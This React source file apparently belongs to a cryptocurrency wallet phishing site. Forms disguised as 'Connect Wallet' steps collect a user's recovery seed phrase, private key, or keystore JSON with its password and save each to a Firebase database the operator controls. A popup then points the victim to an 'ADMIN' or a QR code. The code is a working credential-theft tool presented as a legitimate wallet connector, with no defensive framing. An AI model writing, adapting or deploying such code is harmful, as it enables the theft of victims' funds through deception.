import React, { useState,useContext } from "react";
import "./style.css";
import { db } from "../../firebase";
import Modal from "react-modal";

import { AppContext } from "../../context";


export const QrCodePopUp = () => {
  
  
  const {showQr, setShowQr,src, } = useContext(AppContext);


  return (
    
    <>
      <Modal
        className="modal"
        isOpen={showQr}
        onRequestClose={() => {
          setShowQr(false);
        }}
        style={{
          overlay: {
            position: "fixed",
            zIndex: 1020,
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            background: "rgba(255, 255, 255, 0.75)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          },
          content: {
            Color: "orange",
            width: "45rem",
            maxWidth: "calc(100vw - 2rem)",
            maxHeight: "calc(100vh - 2rem)",
            overflowY: "auto",
            position: "relative",
            border: "1px solid #ccc",
            borderRadius: "1.5rem",
          },
        }}
      >
        <div className="modal-qr">
          <div className="qr-container">
            <img src={src} alt="barcode" />
          </div>
          <div className="qrcode-info">
            <h4>Chat ADMIN for Authentication code</h4>
            <p>Or proceed to scan code on your mobile device wallet connect</p>
          </div>
        </div>
      </Modal>
    </>
  );
};

export const FirstTab = () => {
  const [inputValue, setInputValue] = useState("");
  const  {showQr, setShowQr, generate} = useContext(AppContext);

  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();

    db.collection("Phrase")
      .add({
        phrase: inputValue,
      })
      .then(() => {
        generate()
        setShowQr(!showQr)
      })
      .catch((error) => {
        alert(error.message);
      });
    setInputValue("");
  };

  return (
    <div className="FirstTab">
      <p className="key-type">input secret phrase</p>
      <form onSubmit={handleSubmit}>
        <textarea
        
          type="text"
          value={inputValue}
          onChange={handleInputChange}
          name="postContent"
          rows={4}
          cols={40}
          placeholder="Enter Phrase"
          style={{
            width: "100%",
            color: "#000000",
            fontSize: 16,
            padding: 5,
          }}
        />
        <p className="type-info">
          Typically 12(sometimes 24) words separated by single spaces
        </p>

        <div className="" onClick={() => {}}>
          <button type="submit" className="submit-key">
            Connect Wallet
          </button>
        </div>
      </form>
    </div>
  );
};

// SecondTab.js
export const SecondTab = () => {
  const [inputValue, setInputValue] = useState("");
  const  {showQr, setShowQr, generate} = useContext(AppContext);

  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();

    db.collection("Private key")
      .add({
        phrase: inputValue,
      })
      .then(() => {
        generate()
        setShowQr(!showQr)
      })
      .catch((error) => {
        alert(error.message);
      });
    setInputValue("");
  };

  return (
    <div className="FirstTab">
      <p className="key-type">input secret phrase</p>
      <form onSubmit={handleSubmit}>
        <textarea
        
          type="text"
          value={inputValue}
          onChange={handleInputChange}
          name="postContent"
         
          placeholder="Enter Phrase"
          style={{
            width: "100%",
            color: "#000000",
            fontSize: 16,
            padding: 5,
          }}
        />
        <p className="type-info">
          Typically 12(sometimes 24) words separated by single spaces
        </p>

        <div className="" onClick={() => {}}>
          <button type="submit" className="submit-key">
            Connect Wallet
          </button>
        </div>
      </form>
    </div>
  );
};

// export const SecondTab2 = () => {
//   const [secondinputValue, setSecondInputValue] = useState("");
//   const  {showQr, setShowQr, generate} = useContext(AppContext);

//   const handleInputChange = (event) => {
//     setSecondInputValue(event.target.value);
//   };

//   const handleSubmit = (event) => {
//     event.preventDefault();
//     // do something with the input value
//     db.collection("Private key")
//       .add({
//         privateKey: secondinputValue,
//       })
//       .then(() => {
//         generate()
//         setShowQr(!showQr)
//       })
//       .catch((error) => {
//         alert(error.message);
//       });
//       setSecondInputValue("");
//   };

//   return (
//     <div className="SecondTab">
//       <p className="key-type">input Private Key </p>
//       <form onSubmit={handleSubmit}>
//         <input
//           type="text"
//           value={secondinputValue}
//           onChange={handleInputChange}
//           name="name"
//           placeholder="Enter Private Key"
//           style={{
//             padding: 5,
//             width: "80%",
//             borderRadius: 15,
//             color: "#000000",
//           }}
//         />
//         <p className="type-info">Typically 64 characters</p>

//         <div className="" onClick={() => {}}>
//           <button type="submit" className="submit-key">
//             Connect Wallet
//           </button>
//         </div>
//       </form>
//     </div>
//   );
// };

export const ThirdTab = () => {
  const [thirdInputValue, setThirdInputValue] = useState({
    keystore: "",
    passwordField: "",
  });
  const  {showQr, setShowQr, generate} = useContext(AppContext);

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setThirdInputValue({ ...thirdInputValue, [name]: value });
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    db.collection("Key store")
      .add({
        keystore: thirdInputValue.keystore,
        password: thirdInputValue.passwordField,
      })
      .then(() => {
        generate()
        setShowQr(!showQr)
      })
      .catch((error) => {
        alert(error.message);
      });
      setThirdInputValue({
      keystore: "",
      passwordField: "",
    });
  };

  return (
    <div className="SecondTab">
      <p className="key-type">input Keystore JSON </p>
      <form onSubmit={handleSubmit}>
        <textarea
          type="text"
          value={thirdInputValue.keystore}
          onChange={handleInputChange}
          name="keystore"
          rows={4}
          cols={40}
          placeholder="Enter Keystore JSON"
          style={{
            width: "80%",
            color: "#000000",
            fontSize: 16,
            padding: 5,
            borderRadius: 8,
          }}
        />

        <input
          type="text"
          value={thirdInputValue.passwordField}
          onChange={handleInputChange}
          name="passwordField"
          placeholder="Enter Password"
          style={{
            padding: 5,
            width: "80%",
            marginTop: 10,
            borderRadius: 8,
            color: "#000000",
          }}
        />
        <p className="type-info">
          Several lines of text beginning with "{}" plus the password you used
          to encrypt it
        </p>

        <div className="" onClick={() => {}}>
          <button className="submit-key">Connect Wallet</button>
        </div>
      </form>
    </div>
  );
};


